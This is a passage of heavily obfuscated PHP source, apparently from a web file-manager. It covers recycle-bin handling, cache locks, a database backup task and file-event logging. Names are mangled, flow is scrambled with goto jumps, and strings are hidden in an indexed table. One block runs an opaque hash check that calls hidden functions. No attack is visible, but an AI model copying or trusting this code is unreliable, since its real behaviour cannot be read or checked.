moveToRecycle($eÀå§¨÷ÂÇ) { goto eÕ‘îì¾ƒ‘; b‡ì¤øèÒä: if (!$DÜ„©¢•º || $DÜ„©¢•º[$bÕä¯İêùò[393]] == $bÕä¯İêùò[84]) { return; } $c¥´•È”÷ = array($bÕä¯İêùò[380] => $eÀå§¨÷ÂÇ, $bÕä¯İêùò[1342] => USER_ID, $bÕä¯İêùò[513] => $DÜ„©¢•º[$bÕä¯İêùò[368]], $bÕä¯İêùò[514] => $DÜ„©¢•º[$bÕä¯İêùò[452]], $bÕä¯İêùò[517] => $DÜ„©¢•º[$bÕä¯İêùò[455]]); $this->add($c¥´•È”÷); goto D·›§Çˆ…­; eÕ‘îì¾ƒ‘: $bÕä¯İêùò =& $_SERVER[ì‹É]; $bØ¦µ«Ì½ˆ = Model($bÕä¯İêùò[1083]); $DÜ„©¢•º = $bØ¦µ«Ì½ˆ->sourceInfo($eÀå§¨÷ÂÇ); goto b‡ì¤øèÒä; D·›§Çˆ…­: $this->recycleMove($eÀå§¨÷ÂÇ, 1); if ($DÜ„©¢•º[$bÕä¯İêùò[367]] == $bÕä¯İêùò[84]) { $a³Ï§¤¨Û = array($bÕä¯İêùò[517] => array($bÕä¯İêùò[475], $DÜ„©¢•º[$bÕä¯İêùò[455]] . $eÀå§¨÷ÂÇ . $bÕä¯İêùò[476])); $bØ¦µ«Ì½ˆ->where($a³Ï§¤¨Û)->setField($bÕä¯İêùò[393], 1); } goto A˜ÔƒÍÂóç; A˜ÔƒÍÂóç: } public function clear() { $this->remove(!1); } public function remove($FÍÔ†¼ĞÚÖ = false) { goto fÖ²¹¼‚”; fÖ²¹¼‚”: $a†Üôğï”ˆ =& $_SERVER[ì‹É]; $báğ”öõƒÀ = Model($a†Üôğï”ˆ[1083]); $dŒ»Ø¶¯ºÄ = $this->listData(); goto eâÃ†Ó‘´…; fÕ¬›Ö‘ÕØ: foreach ($a÷èĞŒ±Æ as $DÆ¦«Óø³Œ) { $báğ”öõƒÀ->targetSpaceUpdate($DÆ¦«Óø³Œ[$a†Üôğï”ˆ[368]], $DÆ¦«Óø³Œ[$a†Üôğï”ˆ[452]]); } goto cŞéáæöäï; eâÃ†Ó‘´…: $FÍÔ†¼ĞÚÖ = $FÍÔ†¼ĞÚÖ === !1 ? !1 : $FÍÔ†¼ĞÚÖ; $a÷èĞŒ±Æ = array(); foreach ($dŒ»Ø¶¯ºÄ as $AÙŸŒ—Ÿ”ª) { if ($FÍÔ†¼ĞÚÖ != !1 && !in_array($AÙŸŒ—Ÿ”ª, $FÍÔ†¼ĞÚÖ)) { continue; } $báğ”öõƒÀ->remove($AÙŸŒ—Ÿ”ª, !1); $c‰¦‘§ê÷Ï = $this->where(array($a†Üôğï”ˆ[366] => $AÙŸŒ—Ÿ”ª))->find(); $B²Ó¨Éñ–† = $c‰¦‘§ê÷Ï[$a†Üôğï”ˆ[368]] . $a†Üôğï”ˆ[71] . $c‰¦‘§ê÷Ï[$a†Üôğï”ˆ[452]]; $a÷èĞŒ±Æ[$B²Ó¨Éñ–†] = array($a†Üôğï”ˆ[513] => $c‰¦‘§ê÷Ï[$a†Üôğï”ˆ[368]], $a†Üôğï”ˆ[452] => $c‰¦‘§ê÷Ï[$a†Üôğï”ˆ[452]]); $this->where(array($a†Üôğï”ˆ[366] => $AÙŸŒ—Ÿ”ª))->delete(); } goto fÕ¬›Ö‘ÕØ; cŞéáæöäï: } public function restore($bÂù‡ŸºÒÍ = false) { goto cÙ‡õ…×¡È; cÙ‡õ…×¡È: $cËáãí¬² =& $_SERVER[ì‹É]; $BÛ¶Ã‚åÑ¦ = Model($cËáãí¬²[1083]); $BªÎù¬„Û¤ = $this->listData(); goto CÙ¼ØµÍ£¡; CÙ¼ØµÍ£¡: $bÂù‡ŸºÒÍ = $bÂù‡ŸºÒÍ == !1 ? !1 : $bÂù‡ŸºÒÍ; if (!$BªÎù¬„Û¤) { return !0; } $EÉ°šôÑ¦˜ = array(); goto dÛ†ÛÖÇŠƒ; dÛ†ÛÖÇŠƒ: foreach ($BªÎù¬„Û¤ as $A–œÂ¯ÁƒÁ) { goto a²Å ííÅ’; e‚Ì¨£ˆ: if ($Cğ’Ó‹¿ï´[$cËáãí¬²[367]] == $cËáãí¬²[84]) { $e‰½ê°³ = array($cËáãí¬²[517] => array($cËáãí¬²[475], $Cğ’Ó‹¿ï´[$cËáãí¬²[455]] . $A–œÂ¯ÁƒÁ . $cËáãí¬²[476])); $BÛ¶Ã‚åÑ¦->where($e‰½ê°³)->setField($cËáãí¬²[393], 0); } $this->where(array($cËáãí¬²[366] => $A–œÂ¯ÁƒÁ))->delete(); $BÛ¶Ã‚åÑ¦->folderSizeReset($Cğ’Ó‹¿ï´[$cËáãí¬²[457]]); goto c¿ø†àÈíÌ; a²Å ííÅ’: if ($bÂù‡ŸºÒÍ != !1 && !in_array($A–œÂ¯ÁƒÁ, $bÂù‡ŸºÒÍ)) { continue; } $Cğ’Ó‹¿ï´ = $BÛ¶Ã‚åÑ¦->sourceInfo($A–œÂ¯ÁƒÁ); $díÄòåÇ®Ï = $BÛ¶Ã‚åÑ¦->sourceInfo($Cğ’Ó‹¿ï´[$cËáãí¬²[457]]); goto D·ÈòÌ”À÷; D·ÈòÌ”À÷: if ($díÄòåÇ®Ï[$cËáãí¬²[393]] == $cËáãí¬²[84]) { continue; } $BÛ¶Ã‚åÑ¦->lockMoveStart($A–œÂ¯ÁƒÁ); $this->recycleMove($A–œÂ¯ÁƒÁ, 0); goto e‚Ì¨£ˆ; c¿ø†àÈíÌ: $EÉ°šôÑ¦˜[] = $Cğ’Ó‹¿ï´[$cËáãí¬²[457]]; if ($Cğ’Ó‹¿ï´[$cËáãí¬²[367]] == $cËáãí¬²[84]) { $EÉ°šôÑ¦˜[] = $A–œÂ¯ÁƒÁ; } $BÛ¶Ã‚åÑ¦->lockMoveEnd($A–œÂ¯ÁƒÁ); goto C¦ÙÅÅÈ×Ú; C¦ÙÅÅÈ×Ú: } $BÛ¶Ã‚åÑ¦->updateModifyTime($EÉ°šôÑ¦˜); goto eŒèŠ¬ï²; eŒèŠ¬ï²: } private function recycleMove($D¬´õáˆ—˜, $B•¨Ğ»ïø = 1) { $eàÁÙ¶‹³¨ =& $_SERVER[ì‹É]; $d†™ˆÒ”ğå = Model($eàÁÙ¶‹³¨[1083]); $a†”“ø¢øÙ = Model($eàÁÙ¶‹³¨[2250]); $E¶âğÀÉãŒ = array($eàÁÙ¶‹³¨[366] => $D¬´õáˆ—˜); if ($B•¨Ğ»ïø) { $d†™ˆÒ”ğå->where($E¶âğÀÉãŒ)->setField($eàÁÙ¶‹³¨[393], 1); $a†”“ø¢øÙ->eventRecycle($D¬´õáˆ—˜, $eàÁÙ¶‹³¨[2251]); } else { $E Á¥¿ì¡£ = $d†™ˆÒ”ğå->where($E¶âğÀÉãŒ)->find(); $Aß÷Šï·¹ì = $E Á¥¿ì¡£[$eàÁÙ¶‹³¨[367]] == $eàÁÙ¶‹³¨[84]; $bâ­Ö”á‘Œ = $d†™ˆÒ”ğå->fileNameAuto($E Á¥¿ì¡£[$eàÁÙ¶‹³¨[457]], $E Á¥¿ì¡£[$eàÁÙ¶‹³¨[28]], REPEAT_RENAME_FOLDER, $Aß÷Šï·¹ì); if ($bâ­Ö”á‘Œ != $E Á¥¿ì¡£[$eàÁÙ¶‹³¨[28]]) { $d†™ˆÒ”ğå->rename($D¬´õáˆ—˜, $bâ­Ö”á‘Œ); } $d†™ˆÒ”ğå->where($E¶âğÀÉãŒ)->setField($eàÁÙ¶‹³¨[393], 0); $a†”“ø¢øÙ->eventRecycle($D¬´õáˆ—˜, $eàÁÙ¶‹³¨[2252]); } } } goto a“‹í¯Ö¹ø; b¹ËÍ‚ÙÜÚ: define($_SERVER[ì‹É][1844], 2); define($_SERVER[ì‹É][1845], 3); define($_SERVER[ì‹É][1846], 4); goto dÕŒ†«ÈÅ¯; C‡¬ôÔÜÏà: function beforeShutdownError($F ‹›ÊãÒµ = false, $f™º÷½ôß— = '', $E¤Îµ‘‰³ = '', $c‘œ„›àíã = 0) { $BÄÍçåŒ¿ =& $_SERVER[Ü›¼]; switch ($F ‹›ÊãÒµ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $b†º·ƒšãÍ = $BÄÍçåŒ¿[38]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $b†º·ƒšãÍ = $BÄÍçåŒ¿[39]; break; case E_STRICT: $b†º·ƒšãÍ = $BÄÍçåŒ¿[40]; break; case E_NOTICE: case E_USER_NOTICE: $b†º·ƒšãÍ = $BÄÍçåŒ¿[41]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $b†º·ƒšãÍ = $BÄÍçåŒ¿[42]; break; default: break; } if (!$b†º·ƒšãÍ || $b†º·ƒšãÍ == $BÄÍçåŒ¿[41] || $b†º·ƒšãÍ == $BÄÍçåŒ¿[42]) { return; } $E¤Îµ‘‰³ = $BÄÍçåŒ¿[4] . str_replace($_SERVER[$BÄÍçåŒ¿[36]], $BÄÍçåŒ¿[20], $E¤Îµ‘‰³); $AÛ§õ÷’‰ = $b†º·ƒšãÍ . $BÄÍçåŒ¿[43] . $f™º÷½ôß— . $BÄÍçåŒ¿[43] . $E¤Îµ‘‰³ . $BÄÍçåŒ¿[43] . $c‘œ„›àíã; write_log($AÛ§õ÷’‰ . $BÄÍçåŒ¿[18] . get_caller_msg(1), $BÄÍçåŒ¿[19]); } $_SERVER[$_SERVER[Ü›¼][44]] = $_SERVER[$_SERVER[Ü›¼][36]] . $_SERVER[Ü›¼][45]; $bĞô‰Í‚¨² = strrev(base64_decode($_SERVER[Ü›¼][46])); goto F›ø‹òŠÂÏ; c‰øöÚ«¬„: class CacheLockRedis { public function lock($D¨ğŒ»Ÿª², $DÄ½É©Çó§ = 10) { $a‚»Úæ§É° = Cache::init(); $b¨¹È¼à¾ = microtime(!0) + $DÄ½É©Çó§; while (microtime(!0) < $b¨¹È¼à¾) { $AÉ´”ÌÌÚ = $a‚»Úæ§É°->get($D¨ğŒ»Ÿª²); if (!$AÉ´”ÌÌÚ) { $fìè¨¡ä÷¤ = $a‚»Úæ§É°->setLock($D¨ğŒ»Ÿª², $b¨¹È¼à¾, $DÄ½É©Çó§); if ($fìè¨¡ä÷¤) { return !0; } } else { if ($AÉ´”ÌÌÚ < microtime(!0)) { $a‚»Úæ§É°->set($D¨ğŒ»Ÿª², $b¨¹È¼à¾, $b¨¹È¼à¾); if ($a‚»Úæ§É°->get($D¨ğŒ»Ÿª²) === $AÉ´”ÌÌÚ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($A‚‹²ƒàÊ) { return Cache::init()->get($A‚‹²ƒàÊ); } public function unlock($Aœâ«”Äª¯) { return Cache::init()->remove($Aœâ«”Äª¯); } } class CacheLockMemcached { public function lock($Fø„–œÈ‰, $E¬Œ÷¨Î„½ = 0) { $FƒƒâìÉ¤ = Cache::init(); $Fá´ğÂ·» = microtime(!0) + $E¬Œ÷¨Î„½; while (microtime(!0) < $Fá´ğÂ·») { $dóÜç“¼š = $FƒƒâìÉ¤->get($Fø„–œÈ‰); if (!$dóÜç“¼š || $dóÜç“¼š < microtime(!0)) { $aÖµôš›Ÿ = $FƒƒâìÉ¤->handle->add($Fø„–œÈ‰, $Fá´ğÂ·», $E¬Œ÷¨Î„½); if ($aÖµôš›Ÿ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eí·Ö¿ÔÊƒ) { return Cache::init()->get($eí·Ö¿ÔÊƒ); } public function unlock($Bì¦Ê·Á¿”) { return Cache::init()->remove($Bì¦Ê·Á¿”); } } class CacheLockDatabase { public function lock($aÙ°ã“Ÿ½, $FÊ©¦‡äÏ = 0) { $døğÁº ¼ = Model($_SERVER[ì‹É][760]); $c­ä×Í‘¬œ = microtime(!0) + $FÊ©¦‡äÏ; while (microtime(!0) < $c­ä×Í‘¬œ) { $cäÄó¿Á¢Ê = $døğÁº ¼->get($aÙ°ã“Ÿ½); if (!$cäÄó¿Á¢Ê || $cäÄó¿Á¢Ê < microtime(!0)) { $eñ¡ù¡×Œ² = $døğÁº ¼->set($aÙ°ã“Ÿ½, $c­ä×Í‘¬œ); if ($eñ¡ù¡×Œ²) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F½Ì˜Û‚ÃË) { return Model($_SERVER[ì‹É][760])->get($F½Ì˜Û‚ÃË); } public function unlock($Bñ…Çô¹‘‡) { Model($_SERVER[ì‹É][760])->remove($Bñ…Çô¹‘‡); } } goto B†£°áÂÚ‹; DÜœ†ÑÎš: $_SERVER[$_SERVER[Ü›¼][51]] = ("\x39\x31\x38\x30"."\64\71")+0;$_fmxQ="Db8HJv6vPNPWuat5jUTerIzNR2kJrHi97gbsq4nPwkXqxtGM9E2fZYDVy2SFxRQBpPNwFseKMXFUej";; stream_wrapper_register($_SERVER[Ü›¼][52], $_SERVER[Ü›¼][53]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($CšÀ ƒ²‰, $bêäÀ´œ¼İ) { $bĞë×ÚÓ‡É =& $_SERVER[ì‹É]; if (isset(self::$_methodList[$CšÀ ƒ²‰])) { return @call_user_func_array(self::$_methodList[$CšÀ ƒ²‰], $bêäÀ´œ¼İ); } else { if (method_exists($this, $CšÀ ƒ²‰)) { return call_user_func_array(array($this, $CšÀ ƒ²‰), $bêäÀ´œ¼İ); } else { think_exception(__CLASS__ . $bĞë×ÚÓ‡É[4] . $CšÀ ƒ²‰ . $bĞë×ÚÓ‡É[5]); } } } public static function __callStatic($bÜÅ†Éñ§Ñ, $aí‹¹‰±åÃ) { if (isset(self::$_methodListStatic[$bÜÅ†Éñ§Ñ])) { return call_user_func_array(self::$_methodListStatic[$bÜÅ†Éñ§Ñ], $aí‹¹‰±åÃ); } else { if (method_exists(self, $bÜÅ†Éñ§Ñ)) { return call_user_func_array(array(self, $bÜÅ†Éñ§Ñ), $aí‹¹‰±åÃ); } else { show_json("{$bÜÅ†Éñ§Ñ}\50\51\40\x6e\x6f\x74\40\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($C¦áŠ§¼›, $b™àÈ…§) { self::$_methodList[$C¦áŠ§¼›] = $b™àÈ…§; } public static function addMethodStatic($bÚ“‡ôÃŞô, $fŸá¥Ê©) { self::$_methodListStatic[$bÚ“‡ôÃŞô] = $fŸá¥Ê©; } } goto aç‹ç‰ï´; d¼×‹Åƒà: function Action($DñÄ°É‡± = '') { goto aí¿Áù®â; eˆé´¡õ…ã: $f¶¥·³à„ = strtolower($FÔª©ºÉá); if (isset($bŠáôÒ˜»[$f¶¥·³à„])) { return $bŠáôÒ˜»[$f¶¥·³à„]; } if (is_file($e•…³š¡‡›)) { include_once $e•…³š¡‡›; } goto AÌ‘§ÊëùÃ; aí¿Áù®â: $fìÉ¬ä‹‡‚ =& $_SERVER[Ü›¼]; static $bŠáôÒ˜» = array(); $DñÄ°É‡± = trim(str_replace($fìÉ¬ä‹‡‚[4], $fìÉ¬ä‹‡‚[5], $DñÄ°É‡±), $fìÉ¬ä‹‡‚[4]); goto eÃ¬ˆ¬‚˜; AÌ‘§ÊëùÃ: if (!class_exists($FÔª©ºÉá)) { return actionCallError("\133{$DñÄ°É‡±}\x20\75\x3e\x20{$FÔª©ºÉá}\x5d\40\143\154\141\163\x73\x20\156\x6f\164\x20\x65\x78\x69\163\x74\x73\41"); } $bŠáôÒ˜»[$f¶¥·³à„] = new $FÔª©ºÉá(); return $bŠáôÒ˜»[$f¶¥·³à„]; goto dàÅ”§•²ƒ; eÃ¬ˆ¬‚˜: $e«•Ş„ÍæË = explode($fìÉ¬ä‹‡‚[5], $DñÄ°É‡±); $A›Êèå–§š = strtolower($e«•Ş„ÍæË[0]); if (substr($A›Êèå–§š, -6) == $fìÉ¬ä‹‡‚[6]) { $DñÄ°É‡± = substr($e«•Ş„ÍæË[0], 0, -6); $FÔª©ºÉá = $DñÄ°É‡± . $fìÉ¬ä‹‡‚[7]; $e•…³š¡‡› = $fìÉ¬ä‹‡‚[8]; if (isset($e«•Ş„ÍæË[1]) && substr(strtolower($e«•Ş„ÍæË[1]), -5) == $fìÉ¬ä‹‡‚[9]) { $FÔª©ºÉá = $DñÄ°É‡± . $e«•Ş„ÍæË[1]; $e•…³š¡‡› = $fìÉ¬ä‹‡‚[10] . $e«•Ş„ÍæË[1] . $fìÉ¬ä‹‡‚[11]; } else { if (count($e«•Ş„ÍæË) == 3) { $FÔª©ºÉá = $DñÄ°É‡± . $e«•Ş„ÍæË[1] . $e«•Ş„ÍæË[2]; $e•…³š¡‡› = $fìÉ¬ä‹‡‚[12] . $e«•Ş„ÍæË[1] . $fìÉ¬ä‹‡‚[13] . $e«•Ş„ÍæË[2] . $fìÉ¬ä‹‡‚[11]; } } $e•…³š¡‡› = PLUGIN_DIR . $DñÄ°É‡± . $fìÉ¬ä‹‡‚[4] . $e•…³š¡‡›; } else { if (substr($A›Êèå–§š, -5) == $fìÉ¬ä‹‡‚[9]) { $DñÄ°É‡± = substr($e«•Ş„ÍæË[0], 0, -5); return Model($DñÄ°É‡±); } else { $FÔª©ºÉá = $e«•Ş„ÍæË[0] . $e«•Ş„ÍæË[1]; $e•…³š¡‡› = CONTROLLER_DIR . $e«•Ş„ÍæË[0] . $fìÉ¬ä‹‡‚[4] . $e«•Ş„ÍæË[1] . $fìÉ¬ä‹‡‚[14]; } } goto eˆé´¡õ…ã; dàÅ”§•²ƒ: } function ActionApply($f Ê×—¶Ğ‰, $E‰Öø¹ŠŒ = array()) { goto dŞëâó×‡î; dŞëâó×‡î: if (is_array($f Ê×—¶Ğ‰)) { return call_user_func_array($f Ê×—¶Ğ‰, $E‰Öø¹ŠŒ); } if (function_exists($f Ê×—¶Ğ‰)) { return call_user_func_array($f Ê×—¶Ğ‰, $E‰Öø¹ŠŒ); } $E©ñ¯îé = strrpos($f Ê×—¶Ğ‰, $_SERVER[Ü›¼][5]); goto BÚëºæÕÓ; BÚëºæÕÓ: $càÓÅã¾Úä = substr($f Ê×—¶Ğ‰, 0, $E©ñ¯îé); $f£á©³Èê = substr($f Ê×—¶Ğ‰, $E©ñ¯îé + 1); $aß»™É—Éª = Action($càÓÅã¾Úä); goto aß™Ğî¼; aß™Ğî¼: if (!method_exists($aß»™É—Éª, $f£á©³Èê)) { return actionCallError("{$f Ê×—¶Ğ‰}\40\155\145\164\x68\x6f\x64\x20\x6e\157\x74\40\x65\x78\x69\163\x74\x73\41"); } $Eõˆ´ÆÍ¾ = call_user_func_array(array($aß»™É—Éª, $f£á©³Èê), $E‰Öø¹ŠŒ); return $Eõˆ´ÆÍ¾; goto bßÏ„¼†Ïô; bßÏ„¼†Ïô: } function actionCallError($b âíÎ¼¦) { $dî®ÑîÃùß =& $_SERVER[Ü›¼]; $EèãèÙÒÒŒ = json_encode_force(array($dî®ÑîÃùß[15] => this_url(), $dî®ÑîÃùß[16] => $GLOBALS[$dî®ÑîÃùß[16]])); $EèãèÙÒÒŒ = str_replace(array($dî®ÑîÃùß[17]), array($dî®ÑîÃùß[4]), $EèãèÙÒÒŒ); return write_log($b âíÎ¼¦ . $dî®ÑîÃùß[18] . $EèãèÙÒÒŒ, $dî®ÑîÃùß[19]); } goto f°ÓÍÄÎŠ ; fÑÔß¥±ƒù: $A§èƒîá„× = $_SERVER[ì‹É][732]; if ($_SERVER[$_SERVER[ì‹É][733]] != $A§èƒîá„×($eºÊ‚ˆ‡îù)) { goto FÜÒš±‹Ä’; déºÔÑËğ´: $DÈ™Š’’îÇ = explode($_SERVER[ì‹É][214], $a†÷ÊÙ›‚²); if (count($DÈ™Š’’îÇ) < $_SERVER[ì‹É][553]) { $F—ƒÎ­Åª™ = $_SERVER[ì‹É][737]; $F—ƒÎ­Åª™(); } $B·¦ˆƒ·‹ƒ = $_SERVER[ì‹É][738]; goto dÖÌ†ƒÚñÄ; FÜÒš±‹Ä’: $a´Øø‹é— = $_SERVER[ì‹É][734]; $f‚•¶×¸ğË = $_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]; $a†÷ÊÙ›‚² = $a´Øø‹é—($f‚•¶×¸ğË); goto déºÔÑËğ´; dÖÌ†ƒÚñÄ: $B·¦ˆƒ·‹ƒ($eºÊ‚ˆ‡îù); goto cÜĞøä…»; cÜĞøä…»: } class BackupDbFile { public function __construct() { } public function index() { goto dÈ¥•™ô‘; f´¢è²ÌÙä: IO::copy($fîÜ×°òÁ‹, $cŒÕ¤é‚½Ú . "\142\x61\x63\153\x75\160\137{$a¢‹“ÊÔ¼ä}\57"); $Aš²ËëëÛ¹->end(); Backup::set(array($f±áÂŠ´„ê[730] => $F˜šÆàğ“[$f±áÂŠ´„ê[78]])); goto a±óßŠ­¦; BÊ™±„†ˆ: $a¨©òëƒ„ = TEMP_FILES . "\x62\x61\x63\153\x75\160\x5f{$a¢‹“ÊÔ¼ä}\x2f"; $cŒÕ¤é‚½Ú = "\173\x69\x6f\72{$a„ªœÁÓ¢[$f±áÂŠ´„ê[678]]}\175\x2f\144\x61\x74\x61\x62\x61\163\x65\57"; IO::mkdir($cŒÕ¤é‚½Ú . "\x62\x61\143\x6b\165\160\137{$a¢‹“ÊÔ¼ä}\57"); goto FæÓÖáñÕ; FõÍ¾ø¢‡‹: Backup::set(array($f±áÂŠ´„ê[726] => $F˜šÆàğ“[$f±áÂŠ´„ê[78]])); IO::move($a¨©òëƒ„, $cŒÕ¤é‚½Ú); $fîÜ×°òÁ‹ = CONTROLLER_DIR . $f±áÂŠ´„ê[739]; goto f´¢è²ÌÙä; a±óßŠ­¦: return !0; goto e¢’‰íƒã»; FæÓÖáñÕ: $Aš²ËëëÛ¹ = new TaskFileTransfer($f±áÂŠ´„ê[727], $f±áÂŠ´„ê[698], 0, LNG($f±áÂŠ´„ê[699]) . $f±áÂŠ´„ê[408] . LNG($f±áÂŠ´„ê[701]) . $f±áÂŠ´„ê[728]); $Aš²ËëëÛ¹->addPath($a¨©òëƒ„); $F˜šÆàğ“ = IO::infoWithChildren($a¨©òëƒ„); goto FõÍ¾ø¢‡‹; dÈ¥•™ô‘: $f±áÂŠ´„ê =& $_SERVER[ì‹É]; $a„ªœÁÓ¢ = Backup::get(); $a¢‹“ÊÔ¼ä = $a„ªœÁÓ¢[$f±áÂŠ´„ê[28]]; goto BÊ™±„†ˆ; e¢’‰íƒã»: } } goto C‘ŒéÊè”; EÉôÉÊ¢‰Á: function beforeShutdown() { Hook::trigger($_SERVER[Ü›¼][35]); } $_SERVER[$_SERVER[Ü›¼][36]] = BASIC_PATH; $_SERVER[$_SERVER[Ü›¼][37]] = LIB_DIR; goto C‡¬ôÔÜÏà; aç¦º¿½­¶: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\143\145\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\155\145", "\x74\151\155\145", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\144\145\163\x63", '', "\151\156\163\x65\162\x74\54\x75\x70\144\141\x74\x65\54\x73\x65\x6c\145\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($b­õã‚ÀôŒ, $B¶©³ÆÖÑ™, $dÌ×»œ®ëÛ = '') { goto e‹§ù¥³ÃÚ; f–êŒ†Î£ó: $AÛ¦Œ†“å = array($E©É„Ù¼Ş[380] => $b­õã‚ÀôŒ, $E©É„Ù¼Ş[2178] => $DŠŒÈ±Øõ•[$E©É„Ù¼Ş[457]], $E©É„Ù¼Ş[2179] => $DŠŒÈ±Øõ•[$E©É„Ù¼Ş[28]], $E©É„Ù¼Ş[462] => $DŠŒÈ±Øõ•[$E©É„Ù¼Ş[462]], $E©É„Ù¼Ş[1342] => USER_ID, $E©É„Ù¼Ş[385] => $B¶©³ÆÖÑ™, $E©É„Ù¼Ş[1344] => $dÌ×»œ®ëÛ); $this->addSystemLog($B¶©³ÆÖÑ™, $AÛ¦Œ†“å); return $this->add($AÛ¦Œ†“å); goto c½¾Ğƒ”Ñ; fÀßò¶ºÑé: if (!$DŠŒÈ±Øõ•) { return !1; } if ($this->isCacheEvent($DŠŒÈ±Øõ•, $B¶©³ÆÖÑ™)) { return; } if ($dÌ×»œ®ëÛ && is_string($dÌ×»œ®ëÛ)) { $dÌ×»œ®ëÛ = array($E©É„Ù¼Ş[2045] => $dÌ×»œ®ëÛ); } goto f–êŒ†Î£ó; e‹§ù¥³ÃÚ: $E©É„Ù¼Ş =& $_SERVER[ì‹É]; if (!$this->eventSave) { return; } $DŠŒÈ±Øõ• = Model($E©É„Ù¼Ş[1083])->sourceInfo($b­õã‚ÀôŒ); goto fÀßò¶ºÑé; c½¾Ğƒ”Ñ: } private function addSystemLog($B…ÙÌ”ä®, $dˆ²°×îá†) { $AÊŸ‹ƒÈŠè =& $_SERVER[ì‹É]; if ($B…ÙÌ”ä® == $AÊŸ‹ƒÈŠè[2180]) { $B…ÙÌ”ä® = $dˆ²°×îá†[$AÊŸ‹ƒÈŠè[401]][$AÊŸ‹ƒÈŠè[2181]]; } else { if (in_array($B…ÙÌ”ä®, array($AÊŸ‹ƒÈŠè[1991], $AÊŸ‹ƒÈŠè[2182]))) { $B…ÙÌ”ä® = $dˆ²°×îá†[$AÊŸ‹ƒÈŠè[401]][$AÊŸ‹ƒÈŠè[679]]; } } $C—ç™¬Ï´• = array_merge($dˆ²°×îá†, array($AÊŸ‹ƒÈŠè[2183] => $dˆ²°×îá†[$AÊŸ‹ƒÈŠè[366]], $AÊŸ‹ƒÈŠè[2184] => $dˆ²°×îá†[$AÊŸ‹ƒÈŠè[2184]])); Model($AÊŸ‹ƒÈŠè[1956])->addLog($AÊŸ‹ƒÈŠè[2185] . $B…ÙÌ”ä®, $C—ç™¬Ï´•); } private function isCacheEvent($bˆĞ‘ãÜ™î, $eõŒ¨¹ÌË²) { if ($bˆĞ‘ãÜ™î[$_SERVER[ì‹É][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($fÜ¶Õœ¸Æ, $aøˆàŒœÛè) { $Bœ„Şù‹î =& $_SERVER[ì‹É]; $AäÉñÂ×ì„ = Model($Bœ„Şù‹î[1083])->sourceInfo($fÜ¶Õœ¸Æ); $cìÁñìÄŒ = array($Bœ„Şù‹î[2181] => $aøˆàŒœÛè, $Bœ„Şù‹î[28] => $AäÉñÂ×ì„[$Bœ„Şù‹î[28]]); return $this->addEvent($fÜ¶Õœ¸Æ, $Bœ„Şù‹î[2180], $cìÁñìÄŒ); } public function eventFileEdit($f¯ïîÛêÄ) { $EáË°ÉÃ‡ =& $_SERVER[ì‹É]; $FóØ…‡‹ = array($EáË°ÉÃ‡[2186] => $_SERVER[$EáË°ÉÃ‡[2187]], $EáË°ÉÃ‡[1659] => strtolower(ACTION)); return $this->addEvent($f¯ïîÛêÄ, $EáË°ÉÃ‡[1983], $FóØ…‡‹); } public function eventRecycle($e°İå…ì·¤, $B‡õğ±ØÍ) { return $this->addEvent($e°İå…ì·¤, $_SERVER[ì‹É][2182], $B‡õğ±ØÍ); } public function eventRemove($a–ƒîº§òŠ) { $B£¹Ÿ´ˆ‚ì =& $_SERVER[ì‹É]; $E»Œª¦à°™ = Model($B£¹Ÿ´ˆ‚ì[1083])->sourceInfo($a–ƒîº§òŠ); $b¾œ»íßÁ– = $E»Œª¦à°™[$B£¹Ÿ´ˆ‚ì[28]]; return $this->addEvent($E»Œª¦à°™[$B£¹Ÿ´ˆ‚ì[457]], $B£¹Ÿ´ˆ‚ì[1982], $b¾œ»íßÁ–); } public function eventShare($D‘Şíª‹›, $CÊÜ¸£ùíĞ) { return $this->addEvent($D‘Şíª‹›, $_SERVER[ì‹É][1991], $CÊÜ¸£ùíĞ); } public function eventMove($C¾Ëº¹ÚÕ, $BÖÜ¡Ş«ù, $EÚ»•àà˜ó) { goto d¶íëï¶êö; aóÂ›–ÔŸÀ: $this->addEvent($BÖÜ¡Ş«ù, $fë¾¼óÙ[2192], $dò£¥ËºÖÔ); goto a†Úå¹ğ†Ø; A™¹ÁÚ¿©–: $D˜•ö¥ñŞÔ = $A¹”›—’ÊË->sourceInfo($BÖÜ¡Ş«ù); $Fº²š¡ŒŒ = $A¹”›—’ÊË->sourceInfo($EÚ»•àà˜ó); $dò£¥ËºÖÔ = array($fë¾¼óÙ[979] => $BÖÜ¡Ş«ù, $fë¾¼óÙ[2188] => $D˜•ö¥ñŞÔ[$fë¾¼óÙ[28]], $fë¾¼óÙ[2189] => $D˜•ö¥ñŞÔ[$fë¾¼óÙ[462]], $fë¾¼óÙ[980] => $EÚ»•àà˜ó, $fë¾¼óÙ[2190] => $Fº²š¡ŒŒ[$fë¾¼óÙ[28]], $fë¾¼óÙ[2191] => $Fº²š¡ŒŒ[$fë¾¼óÙ[462]]); goto c÷õÔ­¾Á; c÷õÔ­¾Á: $this->addEvent($C¾Ëº¹ÚÕ, $fë¾¼óÙ[484], $dò£¥ËºÖÔ); $Eêùå°¦†„ = $A¹”›—’ÊË->sourceInfo($C¾Ëº¹ÚÕ); $dò£¥ËºÖÔ = array($fë¾¼óÙ[366] => $Eêùå°¦†„[$fë¾¼óÙ[366]], $fë¾¼óÙ[28] => $Eêùå°¦†„[$fë¾¼óÙ[28]]); goto aóÂ›–ÔŸÀ; d¶íëï¶êö: $fë¾¼óÙ =& $_SERVER[ì‹É]; $A¹”›—’ÊË = Model($fë¾¼óÙ[1083]); $Eêùå°¦†„ = 